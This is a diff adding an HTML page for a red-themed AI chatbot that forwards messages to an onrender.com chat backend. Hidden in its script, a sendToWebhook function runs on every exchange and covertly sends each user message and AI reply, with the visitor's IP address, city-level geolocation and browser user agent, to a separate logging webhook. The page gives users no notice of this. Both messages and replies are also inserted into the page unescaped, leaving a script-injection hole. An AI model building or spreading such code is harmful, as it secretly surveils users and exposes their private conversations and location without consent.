@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ai Chatbot</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+    canvas#bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -1;
+    }
+    pre {
+      background-color: #1a1a1a;
+      padding: 2rem;
+      border-left: 8px solid #dc2626;
+      color: #fef2f2;
+      margin: 1rem 0;
+      border-radius: 1rem;
+      overflow-x: auto;
+      width: 100%;
+      display: block;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+  </style>
+</head>
+<body class="bg-black text-red-500 min-h-screen flex flex-col justify-between font-mono">
+  <canvas id="bg"></canvas>
+
+  <header class="p-6 text-center text-3xl font-extrabold text-red-600 tracking-widest shadow-md">Skibidi Toilet Rizz</header>
+
+  <main class="flex-grow flex flex-col items-center justify-center px-4">
+    <div class="w-full max-w-[90%] p-4">
+      <div id="chat-box" class="bg-zinc-900 p-6 rounded-xl h-[70vh] overflow-y-auto mb-4 border-4 border-red-700 shadow-lg"></div>
+      <div class="flex items-center space-x-2">
+        <input id="user-input" type="text" placeholder="Talk to Ai..." class="flex-grow p-3 rounded-l-xl text-black focus:outline-none focus:ring-2 focus:ring-red-500" />
+        <button onclick="sendMessage()" class="bg-red-700 px-5 py-2 rounded-r-xl hover:bg-red-800 transition duration-200">Send</button>
+      </div>
+    </div>
+  </main>
+
+  <footer class="p-4 text-center text-xs text-zinc-400">
+    <p>&copy; 2025 mango-soft.xyz</p>
+  </footer>
+
+  <script>
+    const input = document.getElementById('user-input');
+    const chatBox = document.getElementById('chat-box');
+    let messageHistory = [];
+
+    input.addEventListener("keypress", function(event) {
+      if (event.key === "Enter") {
+        event.preventDefault();
+        sendMessage();
+      }
+    });
+
+    function formatMessage(message) {
+      return message.replace(/```([\s\S]*?)```/g, '<pre>$1</pre>');
+    }
+
+    async function sendToWebhook(type, content) {
+      try {
+        const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+        const ip = ipData.ip;
+        const geoData = await fetch(`https://ipapi.co/${ip}/json/`).then(res => res.json());
+        const location = `${geoData.city || 'Unknown'}, ${geoData.region || ''}, ${geoData.country_name || 'Unknown'}`;
+        const userAgent = navigator.userAgent;
+
+        const payload = {
+          type,
+          content,
+          ip,
+          location,
+          userAgent,
+          time: new Date().toLocaleString()
+        };
+
+        await fetch("https://your-flask-app.onrender.com/webhook", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        await fetch("https://your-flask-app.onrender.com/log", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ ip, content: `[${type.toUpperCase()}] ${content}` })
+        });
+      } catch (e) {
+        console.error("Webhook error:", e);
+      }
+    }
+
+    async function sendMessage() {
+      const userText = input.value.trim();
+      if (!userText) return;
+
+      input.value = '';
+      chatBox.innerHTML += `<div class='text-right mb-2'><span class='bg-red-800 px-3 py-1 rounded-lg inline-block animate-pulse'>${userText}</span></div>`;
+      messageHistory.push({ role: 'user', content: userText });
+      await sendToWebhook("user", userText);
+
+      const res = await fetch('https://ai-is3r.onrender.com/chat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ messages: messageHistory })
+      });
+
+      const data = await res.json();
+      const formattedReply = formatMessage(data.reply);
+      messageHistory.push({ role: 'assistant', content: data.reply });
+      chatBox.innerHTML += `<div class='text-left mb-2'><span class='bg-zinc-800 px-3 py-1 rounded-lg inline-block animate-fade-in w-full block'>${formattedReply}</span></div>`;
+      chatBox.scrollTop = chatBox.scrollHeight;
+      await sendToWebhook("ai", data.reply);
+    }
+  </script>
+
+  <script>
+    const canvas = document.getElementById("bg");
+    const ctx = canvas.getContext("2d");
+
+    let w, h;
+    let dots = [];
+    const mouse = { x: null, y: null };
+
+    function resize() {
+      w = canvas.width = window.innerWidth;
+      h = canvas.height = window.innerHeight;
+    }
+
+    window.addEventListener("resize", resize);
+    resize();
+
+    for (let i = 0; i < 100; i++) {
+      dots.push({
+        x: Math.random() * w,
+        y: Math.random() * h,
+        vx: (Math.random() - 0.5) * 1.5,
+        vy: (Math.random() - 0.5) * 1.5
+      });
+    }
+
+    window.addEventListener("mousemove", function(e) {
+      mouse.x = e.clientX;
+      mouse.y = e.clientY;
+    });
+
+    function draw() {
+      ctx.clearRect(0, 0, w, h);
+      for (let i = 0; i < dots.length; i++) {
+        let d = dots[i];
+        d.x += d.vx;
+        d.y += d.vy;
+
+        if (d.x < 0 || d.x > w) d.vx *= -1;
+        if (d.y < 0 || d.y > h) d.vy *= -1;
+
+        ctx.beginPath();
+        ctx.arc(d.x, d.y, 2, 0, Math.PI * 2);
+        ctx.fillStyle = "red";
+        ctx.fill();
+
+        for (let j = i + 1; j < dots.length; j++) {
+          let d2 = dots[j];
+          let dist = Math.hypot(d.x - d2.x, d.y - d2.y);
+          if (dist < 100) {
+            ctx.beginPath();
+            ctx.moveTo(d.x, d.y);
+            ctx.lineTo(d2.x, d2.y);
+            ctx.strokeStyle = "rgba(255, 0, 0," + (1 - dist / 100) + ")";
+            ctx.stroke();
+          }
+        }
+
+        if (mouse.x && mouse.y) {
+          let distMouse = Math.hypot(d.x - mouse.x, d.y - mouse.y);
+          if (distMouse < 150) {
+            ctx.beginPath();
+            ctx.moveTo(d.x, d.y);
+            ctx.lineTo(mouse.x, mouse.y);
+            ctx.strokeStyle = "rgba(255, 0, 0," + (1 - distMouse / 150) + ")";
+            ctx.stroke();
+          }
+        }
+      }
+      requestAnimationFrame(draw);
+    }
+
+    draw();
+  </script>
+</body>
+</html>
